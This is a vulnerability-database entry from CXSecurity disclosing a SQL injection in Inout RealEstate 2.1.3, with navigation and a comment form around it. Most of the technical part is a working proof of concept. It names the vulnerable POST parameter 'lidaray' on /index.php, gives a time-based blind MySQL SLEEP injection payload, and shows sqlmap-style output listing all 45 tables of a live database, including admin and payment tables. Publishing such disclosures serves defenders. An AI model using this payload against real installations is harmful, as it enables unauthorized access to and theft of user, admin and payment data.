---
title: Inout RealEstate 2.1.3 SQL Injection
url: https://cxsecurity.com/issue/WLB-2023010039
source: CXSECURITY Database RSS Feed - CXSecurity.com
date: 2023-01-24
fetch_date: 2025-10-04T04:37:46.969357
---

# Inout RealEstate 2.1.3 SQL Injection

[![Home Page](https://cert.cx/cxstatic/images/12018/cxseci.png)](https://cxsecurity.com/)

* [Home](https://cxsecurity.com/)
* Bugtraq
  + [Full List](https://cxsecurity.com/wlb/)
  + [Only Bugs](https://cxsecurity.com/bugs/)
  + [Only Tricks](https://cxsecurity.com/tricks/)
  + [Only Exploits](https://cxsecurity.com/exploit/)
  + [Only Dorks](https://cxsecurity.com/dorks/)
  + [Only CVE](https://cxsecurity.com/cvelist/)
  + [Only CWE](https://cxsecurity.com/cwelist/)
  + [Fake Notes](https://cxsecurity.com/bogus/)
  + [Ranking](https://cxsecurity.com/best/1/)
* CVEMAP
  + [Full List](https://cxsecurity.com/cvemap/)
  + [Show Vendors](https://cxsecurity.com/cvevendors/)
  + [Show Products](https://cxsecurity.com/cveproducts/)
  + [CWE Dictionary](https://cxsecurity.com/allcwe/)
  + [Check CVE Id](https://cxsecurity.com/cve/)
  + [Check CWE Id](https://cxsecurity.com/cwe/)
* Search
  + [Bugtraq](https://cxsecurity.com/search/)
  + [CVEMAP](https://cxsecurity.com/search/cve/)
  + [By author](https://cxsecurity.com/search/author/)
  + [CVE Id](https://cxsecurity.com/cve/)
  + [CWE Id](https://cxsecurity.com/cwe/)
  + [By vendors](https://cxsecurity.com/cvevendors/)
  + [By products](https://cxsecurity.com/cveproducts/)
* RSS
  + [Bugtraq](https://cxsecurity.com/wlb/rss/all/)
  + [CVEMAP](https://cxsecurity.com/cverss/fullmap/)
  + [CVE Products](https://cxsecurity.com/cveproducts/)
  + [Bugs](https://cxsecurity.com/wlb/rss/vulnerabilities/)
  + [Exploits](https://cxsecurity.com/wlb/rss/exploit/)
  + [Dorks](https://cxsecurity.com/wlb/rss/dorks/)
* More
  + [cIFrex](http://cifrex.org/)
  + [Facebook](https://www.facebook.com/cxsec)
  + [Twitter](https://twitter.com/cxsecurity)
  + [Donate](https://cxsecurity.com/donate/)
  + [About](https://cxsecurity.com/wlb/about/)

* [Submit](https://cxsecurity.com/wlb/add/)

|  |  |  |  |
| --- | --- | --- | --- |
|  |  | |  | | --- | | **Inout RealEstate 2.1.3 SQL Injection** **2023.01.23**  Credit:  **[CraCkEr](https://cxsecurity.com/author/CraCkEr/1/)**  Risk: **Medium**  Local: **No**  Remote: ****Yes****  CVE: **N/A**  CWE: **[CWE-89](https://cxsecurity.com/cwe/CWE-89 "Click to see CWE-89")** | |

┌┌───────────────────────────────────────────────────────────────────────────────────────┐
││ C r a C k E r ┌┘
┌┘ T H E C R A C K O F E T E R N A L M I G H T ││
└───────────────────────────────────────────────────────────────────────────────────────┘┘
┌──── From The Ashes and Dust Rises An Unimaginable crack.... ────┐
┌┌───────────────────────────────────────────────────────────────────────────────────────┐
┌┘ [ Vulnerability ] ┌┘
└───────────────────────────────────────────────────────────────────────────────────────┘┘
: Author : CraCkEr :
│ Website : inoutscripts.com │
│ Vendor : Inout Scripts - Nesote Technologies Private Limited │
│ Software : Inout RealEstate 2.1.3 │
│ Vuln Type: SQL Injection │
│ Impact : Database Access │
│ │
│────────────────────────────────────────────────────────────────────────────────────────│
│ ┌┘
└───────────────────────────────────────────────────────────────────────────────────────┘┘
: :
│ Release Notes: │
│ ═════════════ │
│ │
│ SQL injection attacks can allow unauthorized access to sensitive data, modification of │
│ data and crash the application or make it unavailable, leading to lost revenue and │
│ damage to a company's reputation. │
│ │
┌┌───────────────────────────────────────────────────────────────────────────────────────┐
┌┘ ┌┘
└───────────────────────────────────────────────────────────────────────────────────────┘┘
Greets:
The\_PitBull, Raz0r, iNs, SadsouL, His0k4, Hussin X, Mr. SQL
CryptoJob (Twitter) twitter.com/CryptozJob
┌┌───────────────────────────────────────────────────────────────────────────────────────┐
┌┘ © CraCkEr 2023 ┌┘
└───────────────────────────────────────────────────────────────────────────────────────┘┘
Path: /index.php
POST parameter 'lidaray' is vulnerable to SQLI
lidaray=[Inject-HERE]
---
Parameter: lidaray (POST)
Type: time-based blind
Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
Payload: lidaray=' AND (SELECT 9508 FROM (SELECT(SLEEP(5)))BNUc) AND 'IpMJ'='IpMJ
---
[INFO] the back-end DBMS is MySQL
back-end DBMS: MySQL >= 5.0.12
[INFO] fetching tables for database: '\*\*\*\*\*\_realestate'
[INFO] fetching number of tables for database ''\*\*\*\*\*\_realestate'
Database: \*\*\*\*\*\_realestate
[45 tables]
+--------------------------------+
| adcode |
| admin\_account |
| admin\_payment\_details |
| agent\_list\_request\_to\_user |
| broker\_citymap |
| broker\_rate |
| broker\_review |
| brokerabusereport |
| category\_property |
| chat\_details |
| chat\_messages |
| checkout\_ipn |
| countries |
| custom\_field |
| detail\_statistics\_list |
| email\_templates |
| enquiry\_status |
| forgetpassword |
| inout\_ipns |
| invoicegen |
| languages |
| list\_brokermap |
| list\_images |
| list\_main |
| listopenhouse |
| normal\_statistics\_list |
| paymentdetailstat |
| popularsearchlist |
| ppc\_currency |
| public\_side\_media\_detail |
| public\_slide\_images |
| recentsearchlist |
| settings |
| sold\_listing |
| soldlistadd |
| traveller\_bank\_deposit\_history |
| user\_broker\_licenses |
| user\_broker\_registration |
| user\_email\_verification |
| user\_list\_agent\_request |
| user\_registration |
| user\_wishlist\_mapping |
| userabusereport |
| userlistactive |
| wish\_list |
+--------------------------------+
[-] Done

[**See this note in RAW Version**](https://cxsecurity.com/ascii/WLB-2023010039)

[Tweet](https://twitter.com/share)

Vote for this issue:
 0
 0

50%

50%

#### **Thanks for you vote!**

#### **Thanks for you comment!** Your message is in quarantine 48 hours.

Comment it here.

Nick (\*)

Email (\*)

Video

Text (\*)

(\*) - required fields.
Cancel
Submit

|  |  |
| --- | --- |
|  | **{{ x.nick }}** ![]() | Date: {{ x.ux \* 1000 | date:'yyyy-MM-dd' }} *{{ x.ux \* 1000 | date:'HH:mm' }}* CET+1  ---   {{ x.comment }} |

Show all comments

---

Copyright **2025**, cxsecurity.com

|  |

Back to Top